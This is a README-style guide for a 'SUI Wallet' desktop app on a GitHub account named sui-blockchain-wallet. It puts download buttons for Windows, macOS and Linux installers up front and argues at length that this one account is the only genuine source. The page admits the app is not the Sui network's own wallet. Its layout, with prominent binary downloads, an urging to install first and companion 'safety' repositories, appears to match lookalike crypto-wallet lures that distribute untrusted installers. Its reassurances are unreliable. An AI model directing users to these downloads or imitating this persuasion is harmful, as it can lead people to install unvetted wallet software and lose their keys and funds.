![SUI Wallet](assets/banner-article.png)

# How to verify you have the official SUI Wallet

The release page and its published digests are the whole check; nothing else proves a build.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A genuine build comes from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) on the project's own [GitHub account](https://github.com/sui-blockchain-wallet/sui-wallet-desktop), its digest matches the
SHA-256 value published beside it, and the licence in the repository is Apache-2.0. Anything arriving
from a search result, an advertisement, a mirror or a direct message is not the release, however close
its name looks.

## Where the only release lives

The GitHub release is the single distribution channel, and every download page says so. That is the
whole test: one account, one release, three files. There is no mirror, no affiliate download page, no
"direct installer" partner and no second host that a search engine might prefer.

[SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) describes the three assets and which machine each belongs to.
The point here is narrower: it is not enough to have the right platform's file, because a lookalike can
publish a file with the right name for the right platform and still be someone else's build.

## Matching the digest

Each release publishes a SHA-256 value for each of its three assets, and the check is a comparison of two
strings. Windows produces the first with `Get-FileHash`, macOS with `shasum -a 256`, Linux with
`sha256sum`; the value is 64 characters, and it either matches exactly or it does not.

Two details decide whether the comparison means anything. First, compare against the digest on the
release page, not one quoted in a tutorial, a video description or a chat message - a digest copied from
the same place as the file proves nothing. Second, compare all 64 characters; a file that differs in one
digit differs in content.

## What "official" means here, and what it does not

Official, on this project, means published by the project: the same account that holds the source code
holds the release, and the licence covers the code you are running. That is a claim about provenance and
it is checkable in about two minutes.

It is not a claim to be the Sui network's own wallet, and the guides here never make that claim. The Sui
ecosystem has its own wallets with their own publishers; this one is a desktop application from this
project, and a reader who wants a different product should go and get that product from its own source.

## Lookalike names and what they imitate

Fake pages do not invent a design from nothing. They copy the screenshots, borrow the logo, and change
one character in the domain or add a word to the product name - "desktop", "pro", "official", "app". The
page then offers a download button that leads somewhere the project does not control.

The tells are structural rather than cosmetic. A page that shows the three platform files and their
digests is either the release or a mirror of it; a page that shows a single "download" button and a
counter of recent downloads is neither. A name that adds a word to the product is a different name.

[Avoiding SUI Wallet phishing sites](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/avoiding-sui-wallet-phishing-sites.md) sets out the patterns one at a time, including the
advertisement placements that put a paid result above the real one.

## The support channel and what it never asks for

This project runs one support channel, stated in the README and in the app, and that channel never asks
for a seed phrase. That single fact settles most impersonation attempts before any technical check: a
message offering to help, then requesting the 24 words, identified itself in the second half.

A support request that goes the other way - you asking, them answering, no phrase involved - is the shape
of a real channel. Verification is not a service anyone offers you; it is a comparison you perform.

## Checking a build you already installed

A download that has already run is still checkable, because the app reports what it is. The diagnostics
panel names the version, and the release page names the current one; if you kept the file, hash it again
and compare. If you did not keep it, the version alone tells you whether you are on the release or
behind it.

[Is SUI Wallet safe to use?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/is-sui-wallet-safe-to-use.md) takes the same checks and asks what each one protects against.

## FAQ

### How do I check the SHA-256 of the installer before running it?

Open a terminal - PowerShell on Windows, Terminal on macOS or Linux - and run the hash command for your
platform against the file. Compare the 64-character result with the value published beside that asset on
the release page. If they differ, delete the file and download again.

### How do I know a download is genuine?

Three things together: it came from the project's release page, its digest matches, and the repository's
licence file is Apache-2.0. Any one alone is weaker than it looks - a copied page can show a digest that
belongs to its own file.

### Is this the official wallet for Sui?

It is this project's own desktop wallet, published on its own account, and these guides do not claim it
is the Sui network's wallet. The ecosystem has others; what can be verified is where this one came from.

### Who publishes SUI Wallet?

The GitHub account that holds the three repositories - the desktop application, and two companion
projects - publishes the release. That account is the provenance, and it is the thing to check.

### Can I verify a build without a terminal?

Partly. The version in the app's diagnostics panel tells you which build is running, and the release page
tells you the current one. The digest comparison needs a command that prints a hash; every desktop
platform ships one.
